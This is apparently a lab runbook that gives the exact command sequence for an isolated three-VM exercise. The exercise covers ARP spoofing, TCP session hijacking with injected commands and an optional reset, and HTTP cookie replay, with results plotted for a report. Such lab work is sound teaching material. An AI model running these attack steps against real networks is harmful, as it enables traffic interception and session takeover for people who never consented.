# RUN.md — Exact Command Sequence

Copy-paste, in order, one block at a time. Each block is labeled with the
VM it runs on. Open a separate terminal per numbered attacker step marked
"(new terminal, keep running)" — those processes stay up while later steps
run. Substitute your real interface name (`eth1` below) with
`ip a` on the attacker VM if it differs.

This produces two evidence artifacts for the report:
- `results/tcp_hijack_results.csv`, `results/cookie_replay_results.csv`
- `plots/*.png` (generated from the CSVs in the last step)

All commands assume you're in the repo root on every VM.

---

## 0. One-time setup

**Server VM (192.168.56.20)**
```bash
python3 -m venv venv && source venv/bin/activate
pip install flask
```

**Attacker VM (192.168.56.30)**
```bash
sudo apt install -y tcpdump wireshark netcat-openbsd
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt   # scapy, flask, requests, matplotlib
```

**Client VM (192.168.56.10)**
```bash
sudo apt install -y curl netcat-openbsd
```

---

## 1. Server VM — start both services

Terminal 1:
```bash
source venv/bin/activate
python3 server/app.py --port 8080
```

Terminal 2:
```bash
python3 server/telnet_service.py --port 2323
```

Leave both running for the rest of the session.

---

## 2. Attacker VM — baseline capture (no attack)

```bash
source venv/bin/activate
python3 attacker/capture.py start --name baseline --iface eth1 \
  --hosts 192.168.56.10 192.168.56.20
```

## 3. Client VM — one normal session (for the baseline pcap)

```bash
curl -c /tmp/cookies.txt -d "username=alice&password=password123" \
  http://192.168.56.20:8080/login
curl -b /tmp/cookies.txt http://192.168.56.20:8080/account
printf 'hello\r\nwhoami\r\n' | nc 192.168.56.20 2323
```

## 4. Attacker VM — stop baseline capture

```bash
python3 attacker/capture.py stop --name baseline
```

---

## 5. Attacker VM — start attack capture

```bash
python3 attacker/capture.py start --name attack --iface eth1 \
  --hosts 192.168.56.10 192.168.56.20
```

## 6. Attacker VM (new terminal, keep running) — ARP spoofing

```bash
source venv/bin/activate
sudo $(which python3) attacker/arp_spoof.py --client 192.168.56.10 \
  --server 192.168.56.20 --iface eth1
```

Check on the client and server: `arp -n | grep 192.168.56` should now show
the attacker's MAC against the other host's IP. Screenshot this now for the
report (Section 5, "poisoned ARP tables").

## 7. Client VM — open one persistent connection and keep it busy

The TCP-hijack trials need a single, already-established connection that
stays open and keeps sending traffic, so the attacker has fresh live SEQ/ACK
to read on every trial (10 trials * 5s interval = ~50s of heartbeats,
adjust the `seq 1 12` below if you change `--trials`/`--trial-interval` in
step 8):
```bash
(for i in $(seq 1 12); do echo "heartbeat-$i"; sleep 5; done) | nc 192.168.56.10 -s 192.168.56.10 192.168.56.20 2323
```
If your `nc` doesn't support `-s`, drop it — it just fixes the source IP,
which is already correct by default on the client itself:
```bash
(for i in $(seq 1 12); do echo "heartbeat-$i"; sleep 5; done) | nc 192.168.56.20 2323
```
Leave this running until step 8 finishes.

## 8. Attacker VM (new terminal) — TCP hijack, 10 trials

```bash
source venv/bin/activate
sudo $(which python3) attacker/tcp_hijack.py --client 192.168.56.10 \
  --server 192.168.56.20 --port 2323 --iface eth1 \
  --payload "whoami" --trials 10 --trial-interval 5 \
  --csv results/tcp_hijack_results.csv
```
Watch the log lines: each trial prints ACCEPTED / REJECTED / INCONCLUSIVE.
Results are appended to `results/tcp_hijack_results.csv` as it runs.

Optional — demonstrate the real client getting knocked out (do this once,
separately, after the trials above, since it terminates the client's
connection):
```bash
sudo $(which python3) attacker/tcp_hijack.py --client 192.168.56.10 \
  --server 192.168.56.20 --port 2323 --iface eth1 \
  --payload "id" --send-rst
```

## 9. Client VM — fresh login for the cookie-replay trials

```bash
curl -c /tmp/cookies2.txt -d "username=alice&password=password123" \
  http://192.168.56.20:8080/login
```

## 10. Attacker VM (new terminal) — HTTP cookie replay, 10 trials

```bash
source venv/bin/activate
sudo $(which python3) attacker/cookie_replay.py --client 192.168.56.10 \
  --server 192.168.56.20 --port 8080 --iface eth1 \
  --trials 10 --trial-interval 2 \
  --csv results/cookie_replay_results.csv
```
Results are appended to `results/cookie_replay_results.csv` as it runs.

---

## 11. Attacker VM — stop attack capture and ARP spoofing

```bash
python3 attacker/capture.py stop --name attack
```
Go to the terminal running `arp_spoof.py` (step 6) and press **Ctrl-C**. It
restores the real ARP mappings on both hosts and disables IP forwarding
automatically — confirm with `arp -n` on the client/server again.

## 12. Attacker VM — generate the plots

```bash
python3 attacker/plot_results.py
```

This reads `results/*.csv` and writes to `plots/`:
- `tcp_hijack_verdicts.png` — accepted/rejected/inconclusive counts
- `tcp_hijack_seq_progression.png` — captured SEQ per trial (shows it was
  read live, not guessed)
- `tcp_hijack_latency.png` — time from injection to verdict, per trial
- `cookie_replay_latency.png` — `GET /account` latency per trial
- `cookie_replay_success_rate.png` — replay success rate pie chart

Pull `results/*.csv` and `plots/*.png` into the report, alongside the
`captures/baseline.pcap` and `captures/attack.pcap` screenshots called out
in [README.md](README.md)'s evidence checklist.
